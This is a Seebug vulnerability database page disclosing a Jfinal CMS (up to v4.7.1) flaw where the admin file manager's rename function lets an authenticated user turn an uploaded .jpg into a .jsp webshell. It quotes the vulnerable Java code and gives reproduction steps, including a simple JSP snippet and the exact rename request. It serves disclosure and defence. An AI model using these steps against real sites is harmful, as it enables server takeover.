=== Content from www.seebug.org_99d1c650_20250119_115723.html ===

![Seebug](/static/dist2/images/weixin-share-sm.jpg)

[![Knownsec-logo](/static/dist2/images/knownsec-logo.png)](https://www.knownsec.com?from=seebug_logo)
![](/static/dist2/images/line.png)
[![Seebug-logo](/static/dist2/images/seebug-logo2023.png?v=2)](/)

* [Index](/)
* [Submit Vulnerability](/contribute/vul)
* [Rank](/hackers)
* Market
  + [Exchange](/exchange/goods)
  + [Newest PoC](/vuldb/vulnerabilities?has_poc=true)
* [Search](/search/)* Community
    + [Pocsuite](http://pocsuite.org/)
    + [Ceye.io](http://ceye.io/)
    + [Paper](http://paper.seebug.org/)
    + [KCon](http://kcon.knownsec.com/)
    + [ZoomEye](https://www.zoomeye.org/)
  * About
    + [Data Statistics](/stat)
    + [Vul Market](/help/about)
    + [Develop Document](https://pocsuite.org/guide/what-is-pocsuite3.html)
    + [Guideline](/help/user_level)
    + [Feedback](/help/feedback)
    + [Help](/help/reward)

* [Login](/accounts/login/?next=/vuldb/ssvid-97886)
* [Register](/accounts/register?next=/vuldb/ssvid-97886)

Toggle navigation

* [Login](/accounts/login/?next=/vuldb/ssvid-97886)
* [Index](/)
* Reward and Rank
  + [Detail Reward List](/vuldb/reward/detail)
  + [PoC Reward List](/vuldb/reward/poc)
  + [Exchange](/exchange/goods)
  + [Rank](/hackers)
  + [Submit New Vulnerability](/contribute/vul)
* Vulnerability Database
  + [Vulnerability List](/vuldb/vulnerabilities)
  + [Component Categories](/appdir/)
  + [Vulnerability Category](/category/)
* [Search](/search/)
* [Data Statistics](/stat)
* [Paper](http://paper.seebug.org/)

# Jfinal cms Any file renamed in the background, Getshell

 Follow
0

### Basic Fields

SSV ID:
[SSV-97886](/help/vul#ssv)

Find Time:
Unknown

Submit Time:
2019-03-29

Level:

Category:
[文件上传](/category/upload-files)

Component:
[Jfinal cms](/appdir/Jfinal%20cms)

Author:
Unknown

Submitter:
anonymous

CVE-ID：
Add

CNNVD-ID：
Add

CNVD-ID：
Add

ZoomEye Dork：
Add

### Source

### Detail

Contributor
anonymous
Got  0KB

## Jfinal cms Any file renamed in the background, Getshell
### Introduction to Vulnerability
Jfinal cms, using the simple and powerful JFinal as the web framework, the template engine is beetl, the database uses mysql, front-end bootstrap, flat ui and other frameworks. Support multi-site, oauth2 authentication, account registration, password encryption, comments and replies, message prompts, website traffic statistics, article comments and pageview statistics, response management, rights management, etc. The background template management office does not filter the new file name passed in by the user, resulting in getshell.
### Vulnerability Impact
- <= v4.7.1
### Vulnerability Analysis
The vulnerability trigger point is in `com/jflyfox/modules/filemanager/FileManagerController.java`
```java
public void index() {
HttpServletRequest request = getRequest();
try {
request.setCharacterEncoding("UTF-8");
getResponse().setCharacterEncoding("UTF-8");
} catch (UnsupportedEncodingException e) {
e.printStackTrace();
}
FileManager fm = new FileManager(getRequest());
JSONObject responseData = null;
String mode = "";
String path = "";
boolean needPath = false;
boolean putTextarea = false;
if (!auth()) {
fm.error(fm.lang("AUTHORIZATION\_REQUIRED"));
} else {
String contextPath = request.getContextPath();
// 设置contextPath
fm.setGetVar("contextPath", contextPath);
mode = request.getParameter("mode");
path = request.getParameter("path");
if (path != null) {
try {
if (request.getMethod().equals("GET"))
path = new String(path.getBytes("ISO8859-1"), "UTF-8");
} catch (UnsupportedEncodingException e) {
e.printStackTrace();
}
needPath = fm.setGetVar("path", path);
}
if (request.getMethod().equals("GET")) {
if (mode != null && mode != "") {
if (mode.equals("getinfo")) {
if (needPath) {
responseData = fm.getInfo();
}
} else if (mode.equals("getfolder")) {
if (needPath) {
responseData = fm.getFolder();
}
} else if (mode.equals("rename")) {
String oldFile = request.getParameter("old");
String newFile = request.getParameter("new");
try {
oldFile = new String(oldFile.getBytes("ISO8859-1"), "UTF-8");
newFile = new String(newFile.getBytes("ISO8859-1"), "UTF-8");
```
When the incoming mode is rename, the `FileManager.rename()` handler is called, followed by `rename()`
```java
public JSONObject rename() {
String oldFile = this.get.get("old");
String newFile = this.get.get("new");
oldFile = getFilePath(oldFile);
if (oldFile.endsWith("/")) {
this.get.put("old", oldFile.substring(0, oldFile.length() - 1));
}
boolean error = false;
JSONObject array = null;
String tmp[] = oldFile.split("/");
String filename = tmp[tmp.length - 1];
int pos = oldFile.lastIndexOf("/");
String path = oldFile.substring(0, pos + 1);
File fileFrom = null;
File fileTo = null;
try {
fileFrom = new File(this.fileRoot + oldFile);
fileTo = new File(this.fileRoot + path + newFile);
if (fileTo.exists()) {
if (fileTo.isDirectory()) {
this.error(sprintf(lang("DIRECTORY\_ALREADY\_EXISTS"), newFile));
error = true;
} else { // fileTo.isFile
this.error(sprintf(lang("FILE\_ALREADY\_EXISTS"), newFile));
error = true;
}
} else if (!fileFrom.renameTo(fileTo)) {
this.error(sprintf(lang("ERROR\_RENAMING\_DIRECTORY"), filename + "#" + newFile));
error = true;
}
} catch (Exception e) {
if (fileFrom.isDirectory()) {
this.error(sprintf(lang("ERROR\_RENAMING\_DIRECTORY"), filename + "#" + newFile));
} else {
this.error(sprintf(lang("ERROR\_RENAMING\_FILE"), filename + "#" + newFile));
}
error = true;
}
if (!error) {
array = new JSONObject();
try {
array.put("Error", "");
array.put("Code", 0);
array.put("Old Path", this.get.get("old"));
array.put("Old Name", filename);
array.put("New Path", path + this.get.get("new"));
array.put("New Name", this.get.get("new"));
} catch (JSONException e) {
this.error("JSONObject error");
}
}
return array;
}
```
There is no restriction or filtering on the new file name passed by the user, which directly causes the malicious attacker to rename the file to a jsp file.
### Vulnerability recurrence
1. Login to the background
2. Click on Template Management
3. Click Upload to upload a file named shell.jpg with the contents ``% out.print("123");%>`
![](https://images.seebug.org/1553855522696-w331s)
4. Rename the file and change shell.jpg to shell.jsp
```
Http://localhost:8080/jfinal\_cms/admin/filemanager?mode=rename&old=%2Fjfinal\_cms%2Fshell.jpg&new=shell.jsp&config=filemanager.config.js
```
![](https://images.seebug.org/1553855530679-w331s)
5. Access the shell
![](https://images.seebug.org/1553855537089-w331s)
![Loading icon](/static/dist2/bower_components/loading/loading-bars.svg)

have 0  exchange

### PoC

Unavailable PoC

### Reference Linking

* <https://www.seebug.org/>

### Solutions

**Temp Solutions**

Unavailable Temp Solutions

**Official Solution**

Unavailable Official solution

**Defense Solutions**

Unavailable Defense Solutions

Improve Solutions

BackSubmit

[![](/media/banner/2017/08/22/150338358279.png)](https://www.yunaq.com/)

[![](/media/banner/2020/05/26/159048249988.png)](https://www.yunaq.com/help/article?id=5ebcf0e3439fa500115a1326?from=seebugb00515)

[![](/media/banner/2017/08/09/150226089416.png)](https://scanv.yunaq.com/stcs/index.html?from=seebugb00526)

[![](/media/banner/2020/01/16/157914493733.png)](https://www.yunaq.com/dbzx?from=seebugb00115)

---

### Timeline

* 发现/披露了漏洞
* ![anonymous](/static/dist2/images/avatar.png)
  anonymous

  2019-03-29
  提交了漏洞
* ![anonymous](/static/dist2/images/avatar.png)
  anonymous

  2019-03-29
  提交补充了漏洞详情

---

### Related Vuls

* [jfinal CMS v5.1.0代码执行漏洞(CVE-2023-30349)](/vuldb/ssvid-99691)
* [Jfinal cms Backstage Site Management File Upload Vulnerability](/vuldb/ssvid-97897)
* [Jfinal cms Background Article Management Office File Upload Vulnerability](/vuldb/ssvid-97896)
* [Jfinal cms Background Image Management Office File Upload Vulnerability](/vuldb/ssvid-97895)
* [Jfinal cms Background Video Management Office File Upload Vulnerability](/vuldb/ssvid-97894)
* [Jfinal cms Background Template Management Office File Upload Vulnerability](/vuldb/ssvid-97893)
* [Jfinal cms Background Scrolling Image File Upload Vulnerability](/vuldb/ssvid-97892)
* [Jfinal cms Any file renamed in the background, Getshell](/vuldb/ssvid-97886)
* [Jfinal cms Any file deletion in the background](/vuldb/ssvid-97885)
* [Jfinal cms background arbitrary file read](/vuldb/ssvid-97884)

 Follow
0

Popularity
1965

0

![](/static/images/anonymous.jpg)
##### Need to bind phone before comment. [Bind Now](https://sso.telnet404.com/accounts/bind_phone/)

Submit Comment

 anonymous reply

#### Unavailable Comments

※Any content provided by this site, only to learn the code and services, not for illegal purposes

captcha![]()

OK
Back

×
#### Hello,

您的会员可兑换次数还剩：
次

本次兑换将消耗 1 次

Vulnerabilities

* [Vulnerability List](/vuldb/vulnerabilities)
* [Component Categories](/appdir/)
* [Vulnerability Category](/category/)

More

* [Reward List](/vuldb/reward/poc)
* [Rank](/hackers)

Help

* [About](/help/about)
* [Relevant Instructions](/help/user_level)
* [Vulnerability Definition](/help/vul)
* [Reward Plan](/help/reward)

Contact

* 010-57076191
* s1@seebug.org
* 15th Floor, Unit A, Tower 3, Wangjing SOHO, Fu'an West Road, Chaoyang District, Beijing 100102, P.R.China

Public links

* [Knownsec](https://www.knownsec.com/#/)
* [yunaq](https://www.yunaq.com/cyd/?from=cj_cyd_sbug)
* [创宇蜜罐-诱捕溯源](https://mg.yunaq.com/#/?from=seebuglink)
* [ScanV](https://www.scanv.com/?from=seebug)
* [hackernews](http://hackernews.cc/)

Follow Us

[![](https://aqyzmedia.yunaq.com/labels/label_sm_90040.png)](https://v.yunaq.com/certificate?domain=www.seebug.org&from=label)

[![](/static/dist2/images/ksz-kcon-new.svg)](http://kcon.knownsec.com/)

[![](/static/dist2/images/seebug-logo2023.png)](/)

[![](/static/dist2/images/ksz-zoomeye.svg)](https://www.zoomeye.org/)

[![](/static/dist2/images/yunaq-logo.png)](https://www.yunaq.com/?from=sbg0702)

[京ICP备10040895号](https://beian.miit.gov.cn/)
[![](/static/dist2/images/beian.png)
京公网安备 11010502034610号](http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=11010502034610)
Copyright @ 404 Team from Knownsec.
[简体中文](/accounts/language/?l=zh-cn)

×
#### Hello,

please call the customer service hotline to recharge, thank you for your continued support Seebug!

 010-57076191


